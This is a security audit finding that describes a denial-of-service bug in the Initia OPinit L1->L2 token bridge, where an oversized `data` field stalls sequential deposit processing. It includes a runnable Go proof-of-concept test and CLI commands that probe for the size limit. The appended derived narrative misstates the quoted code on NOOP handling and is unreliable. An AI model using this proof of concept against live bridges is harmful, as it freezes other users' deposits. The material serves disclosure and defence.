---
id: 2063
severity: "High"
---

# `L1->L2` token deposits can be DoS’ed by purposefully providing a large `data` field in `MsgInitiateTokenDeposit`

## Description

On L2, `MsgFinalizeTokenDeposit` [must be relayed in strict sequence](https://github.com/initia-labs/OPinit/tree/7da22a78f367cb25960ed9c536500c2754bd5d06/x/opchild/keeper/msg_server.go#L390-L395), matching `finalizedL1Sequence, err := ms.GetNextL1Sequence(ctx)`

[`x/opchild/keeper/msg_server.go::FinalizeTokenDeposit(..)`](https://github.com/initia-labs/OPinit/tree/7da22a78f367cb25960ed9c536500c2754bd5d06/x/opchild/keeper/msg_server.go#L385-L395)

```solidity
385:     finalizedL1Sequence, err := ms.GetNextL1Sequence(ctx)
386:     if err != nil {
387:         return nil, err
388:     }
389:
390:     if req.Sequence < finalizedL1Sequence {
391:         // No op instead of returning an error
392:         return &types.MsgFinalizeTokenDepositResponse{Result: types.NOOP}, nil
393:     } else if req.Sequence > finalizedL1Sequence {
394:         return nil, types.ErrInvalidSequence
395:     }
```

As long as a specific L1 sequence is not successfully processed, subsequent `L1->L2` deposits have to wait and cannot be processed. If it were possible to purposefully create a `MsgFinalizeTokenDeposit` message that cannot be executed on L2, it will **DoS all subsequent deposits to L2**!

Due to strict validation on the L1 in `InitiateTokenDeposit(..)` it seems almost impossible to create such a message.

However, the `data` field in `MsgFinalizeTokenDeposit` is not restricted in size. This allows creating a message that is so large that it cannot be processed on L2. Specifically, the RPC message size limit (`rpc-max-body-bytes` and `max_body_bytes`) and the mempool/consensus max tx size limit (`maxTxBytes`) might be exceeded, preventing the message from being processed.

The RPC limits messages by default to [**1MB**](https://github.com/cosmos/cosmos-sdk/blob/eb1a8e88a4ddf77bc2fe235fc07c57016b7386f0/tools/confix/data/v0.50-app.toml#L147), while `maxTxBytes` is set to **2MB** (on [`L1`](https://github.com/initia-labs/initia/blob/c79d3315f16e624f9a39641c52f63b3fc5e2881b/cmd/initiad/config.go#L76) and the [`minimove L2`](https://github.com/initia-labs/minimove/blob/b36d068a7faec31a59d56472e77a9785397f9663/cmd/minitiad/config.go#L88)).

Note that the RPC limit is not 100% effective. An active validator is not limited by it and can include a message in a proposed block that is larger than the RPC limit, but smaller than the mempool limit.

Given that `data` is unrestricted, and `MsgInitiateTokenDeposit` on L1 contains less properties than `MsgFinalizeTokenDeposit` on L2, it is possible to create a `MsgInitiateTokenDeposit` message that is smaller than the enforced 2MB, but when relayed to L2, the `MsgFinalizeTokenDeposit` message is too large (e.g., due to the additional `BaseDenom` field and others) and thus rejected.

[`MsgFinalizeTokenDeposit`](https://github.com/initia-labs/OPinit/tree/7da22a78f367cb25960ed9c536500c2754bd5d06/x/opchild/types/tx.pb.go#L195-L212)

```solidity
195: type MsgFinalizeTokenDeposit struct {
196:     // the sender address
197:     Sender string `protobuf:"bytes,1,opt,name=sender,proto3" json:"sender,omitempty" yaml:"sender"`
198:     // from is l1 sender address
199:     From string `protobuf:"bytes,2,opt,name=from,proto3" json:"from,omitempty"`
200:     // to is l2 recipient address
201:     To string `protobuf:"bytes,3,opt,name=to,proto3" json:"to,omitempty"`
202:     // amount is the coin amount to deposit.
203:     Amount types1.Coin `protobuf:"bytes,4,opt,name=amount,proto3" json:"amount" yaml:"amount"`
204:     // sequence is the sequence number of l1 bridge
205:     Sequence uint64 `protobuf:"varint,5,opt,name=sequence,proto3" json:"sequence,omitempty"`
206:     // height is the height of l1 which is including the deposit message
207:     Height uint64 `protobuf:"varint,6,opt,name=height,proto3" json:"height,omitempty"`
208:     // base_denom is the l1 denomination of the sent coin.
209:     BaseDenom string `protobuf:"bytes,7,opt,name=base_denom,json=baseDenom,proto3" json:"base_denom,omitempty"`
210:     /// data is a extra bytes for hooks.
211:     Data []byte `protobuf:"bytes,8,opt,name=data,proto3" json:"data,omitempty"`
212: }
```

VS [`MsgInitiateTokenDeposit`](https://github.com/initia-labs/OPinit/tree/7da22a78f367cb25960ed9c536500c2754bd5d06/x/ophost/types/tx.pb.go#L349-L355)

```solidity
349: type MsgInitiateTokenDeposit struct {
350:     Sender   string     `protobuf:"bytes,1,opt,name=sender,proto3" json:"sender,omitempty" yaml:"sender"`
351:     BridgeId uint64     `protobuf:"varint,2,opt,name=bridge_id,json=bridgeId,proto3" json:"bridge_id,omitempty" yaml:"bridge_id"`
352:     To       string     `protobuf:"bytes,3,opt,name=to,proto3" json:"to,omitempty" yaml:"to"`
353:     Amount   types.Coin `protobuf:"bytes,4,opt,name=amount,proto3" json:"amount" yaml:"amount"`
354:     Data     []byte     `protobuf:"bytes,5,opt,name=data,proto3" json:"data,omitempty" yaml:"data"`
355: }
```

Additionally, the [executor batches messages into a single Cosmos tx](https://github.com/initia-labs/opinit-bots/blob/640649b97cbfa5782925b7dc8c0b62b8fa5367f6/node/broadcaster/broadcaster.go#L278-L297) without any check that the incremental payload exceeds the maximum length that can be accepted by the API, which might lead to this scenario occurring organically if enough messages of “normal” size accumulate.

Ultimately, `L1->L2` deposits can be DoS’ed by purposefully providing a large `data` field which results in the L2 `MsgFinalizeTokenDeposit` message being too large to be processed.

## Proof of Concept

The following PoC demonstrates how a large `data` field in `MsgInitiateTokenDeposit` can lead to a DoS of `L1->L2` deposits.

Paste the test case into `opinit-bots/e2e/multiple_txs_test.go` and run with `go test -v . -timeout 30m -run TestMultipleDepositsAndWithdrawalsExceedingLimit`.

```solidity
func TestMultipleDepositsAndWithdrawalsExceedingLimit(t *testing.T) {
	l1ChainConfig := &ChainConfig{
		ChainID:        "initiation-2",
		Image:          ibc.DockerImage{Repository: "ghcr.io/initia-labs/initiad", Version: "v0.6.4", UIDGID: "1000:1000"},
		Bin:            "initiad",
		Bech32Prefix:   "init",
		Denom:          "uinit",
		Gas:            "auto",
		GasPrices:      "0.025uinit",
		GasAdjustment:  1.2,
		TrustingPeriod: "168h",
		NumValidators:  1,
		NumFullNodes:   0,
	}

	l2ChainConfig := &ChainConfig{
		ChainID:        "minimove-2",
		Image:          ibc.DockerImage{Repository: "ghcr.io/initia-labs/minimove", Version: "v0.6.5", UIDGID: "1000:1000"},
		Bin:            "minitiad",
		Bech32Prefix:   "init",
		Denom:          "umin",
		Gas:            "auto",
		GasPrices:      "0.025umin",
		GasAdjustment:  1.2,
		TrustingPeriod: "168h",
		NumValidators:  1,
		NumFullNodes:   0,
	}

	daChainConfig := &DAChainConfig{
		ChainConfig: *l1ChainConfig,
		ChainType:   ophosttypes.BatchInfo_CHAIN_TYPE_INITIA,
	}

	bridgeConfig := &BridgeConfig{
		SubmissionInterval:    "5s",
		FinalizationPeriod:    "10s",
		SubmissionStartHeight: "1",
		OracleEnabled:         false,
		Metadata:              "",
	}

	ctx := context.Background()

	op := SetupTest(t, ctx, BotExecutor, l1ChainConfig, l2ChainConfig, daChainConfig, bridgeConfig)

	user0 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(10_000_000), op.Initia, op.Minitia)
	user1 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(100_000), op.Initia, op.Minitia)
	user2 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(100_000), op.Initia, op.Minitia)
	user3 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(100_000), op.Initia, op.Minitia)
	user4 := interchaintest.GetAndFundTestUsers(t, ctx, "user", math.NewInt(100_000), op.Initia, op.Minitia)
	amount := sdk.NewCoin(op.Initia.Config().Denom, math.NewInt(1000))

	broadcaster := cosmos.NewBroadcaster(t, op.Initia.CosmosChain)

	dataLength := 1_000_000 // ~1MB

	data := make([]byte, dataLength)

	msg := ophosttypes.NewMsgInitiateTokenDeposit(
		user0[0].FormattedAddress(),
		1,
		user1[1].FormattedAddress(),
		amount,
		data,
	)

	broadcaster.ConfigureFactoryOptions(
		func(factory tx.Factory) tx.Factory {
			return factory.WithGas(20_000_000)
		},
	)

	broadcaster.ConfigureClientContextOptions(
		func(clientContext client.Context) client.Context {
			return clientContext.WithSimulation(false)
		},
	)

	tx, err := cosmos.BroadcastTx(
		ctx,
		broadcaster,
		user0[0],
		msg,
	)

	require.NoError(t, err, "error broadcasting tx")
	require.Zero(t, tx.Code, "initiate token deposit tx failed: %s - %s - %s", tx.Codespace, tx.RawLog, tx.Data)

	op.Logger.Info("initiate token deposit tx with large data broadcasted", zap.String("tx_hash", tx.TxHash))

	_, err = op.Initia.InitiateTokenDeposit(ctx, user1[0].KeyName(), 1, user2[1].FormattedAddress(), amount.String(), "", true)
	require.NoError(t, err)
	_, err = op.Initia.InitiateTokenDeposit(ctx, user2[0].KeyName(), 1, user3[1].FormattedAddress(), amount.String(), "", true)
	require.NoError(t, err)
	_, err = op.Initia.InitiateTokenDeposit(ctx, user3[0].KeyName(), 1, user4[1].FormattedAddress(), amount.String(), "", true)
	require.NoError(t, err)
	_, err = op.Initia.InitiateTokenDeposit(ctx, user4[0].KeyName(), 1, user0[1].FormattedAddress(), amount.String(), "", true)
	require.NoError(t, err)

	err = testutil.WaitForBlocks(ctx, 5, op.Initia, op.Minitia)
	require.NoError(t, err)

	res, err := op.Initia.QueryTokenPairByL1Denom(ctx, 1, op.Initia.Config().Denom)
	require.NoError(t, err)

	user0Balance, err := op.Minitia.BankQueryBalance(ctx, user0[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)
	user1Balance, err := op.Minitia.BankQueryBalance(ctx, user1[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)
	user2Balance, err := op.Minitia.BankQueryBalance(ctx, user2[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)
	user3Balance, err := op.Minitia.BankQueryBalance(ctx, user3[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)
	user4Balance, err := op.Minitia.BankQueryBalance(ctx, user4[1].FormattedAddress(), res.TokenPair.L2Denom)
	require.NoError(t, err)

	require.Equal(t, int64(1000), user0Balance.Int64())
	require.Equal(t, int64(1000), user1Balance.Int64())
	require.Equal(t, int64(1000), user2Balance.Int64())
	require.Equal(t, int64(1000), user3Balance.Int64())
	require.Equal(t, int64(1000), user4Balance.Int64())
}
```

After a while, the logs will show that the Cosmos transaction containing the `MsgFinalizeTokenDeposit` message is rejected due to the message size limit.

```solidity
2025-01-13T22:05:38.586Z    WARN    executor    broadcaster/process.go:119    retry to handle processed msgs    {"seconds": 8, "count": 2, "error": "simulation failed: error in json rpc client, with http response metadata: (Status: 400 Bad Request, Protocol HTTP/1.1). RPC error -32600 - Invalid Request: error reading request body: http: request body too large"}
```

This is a proof that `L1->L2` deposits can be DoS’ed by purposefully providing a large `data` field that results in the L2 `MsgFinalizeTokenDeposit` message being too large to be processed on L2.

The size of `data` can be meticulously crafted to be just the L1 RPC and mempool limit, but exceed浚 the limits L2.

One way to do so is to alter the `NewInitiateTokenDeposit` command to accept data size instead of content:

```solidity
dataLen, err := strconv.ParseUint(args[3], 10, 64)
if err != nil {
    return err
}

data := make([]byte, dataLen)
```

With this change, it is possible to bisect incrementally larger sizes to find the right limit of a signed transaction (below 749667 is found):

```solidity
➜  initia git:(main) ✗ build/initiad tx ophost initiate-token-deposit 1 abc 1uinit 749667 --from=validator --chain-id=initia-1
[...]
raw_log: 'out of gas in location: txSize; gasWanted: 200000, gasUsed: 7500502: out
  of gas'
[...]

➜  initia git:(main) ✗ build/initiad tx ophost initiate-token-deposit 1 abc 1uinit 749668 --from=validator --chain-id=initia-1
[...]
error in json rpc client, with http response metadata: (Status: 400 Bad Request, Protocol HTTP/1.1). RPC error -32600 - Invalid Request: error reading request body: http: request body too large
```

## Recommendation

No recommendation

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a denial‑of‑service condition that arises when a bridge user submits an L1→L2 token deposit containing an excessively large arbitrary data payload. The bridge contract on L2 processes deposits through a two‑step flow: an L1 message (MsgInitiateTokenDeposit) is relayed to L2 where a corresponding MsgFinalizeTokenDeposit must be executed in strict sequential order. The sequence number is only advanced after a successful finalization; if a finalization fails, the bridge refuses to process any later deposits until the missing sequence is resolved. Because the MsgFinalizeTokenDeposit structure includes a free‑form byte array called data and the protocol does not enforce any size limit on this field, an attacker can craft a deposit whose data size is small enough to pass L1 RPC and mempool limits (e.g., under the 2 MB maxTxBytes) but large enough to exceed L2 limits (the default 1 MB RPC body limit and the L2 maxTxBytes). When the oversized MsgFinalizeTokenDeposit reaches the L2 node, the transaction is rejected with an “request body too large” error, the sequence number is not incremented, and the bridge logic returns a NOOP for any subsequent deposit with a higher sequence. Consequently, all later L1→L2 deposits are blocked indefinitely. From a user’s perspective the deposit appears to have been accepted on L1, but the expected token never appears on L2; the UI may show a pending deposit forever, balances remain zero, and refunds are never received. The issue was discovered during a security audit that included a proof‑of‑concept test broadcasting a deposit with a 1 MB data field, which caused the L2 finalization to fail and the bridge to stall. The bug is hard to notice because the L1 transaction succeeds and no explicit error is emitted on the L1 side; only low‑level RPC logs on L2 reveal the size rejection. The root cause is the lack of validation on the data field size combined with strict sequential processing that does not tolerate gaps. To remediate, the bridge should enforce a maximum length for the data payload on the L1 side, reject deposits that would generate an oversized MsgFinalizeTokenDeposit, or adjust L2 limits and add graceful handling for oversized messages (e.g., splitting data or skipping the hook). This would prevent an attacker from deliberately halting the deposit pipeline and ensure that token deposits continue to be processed as intended, preserving user funds and protocol availability.
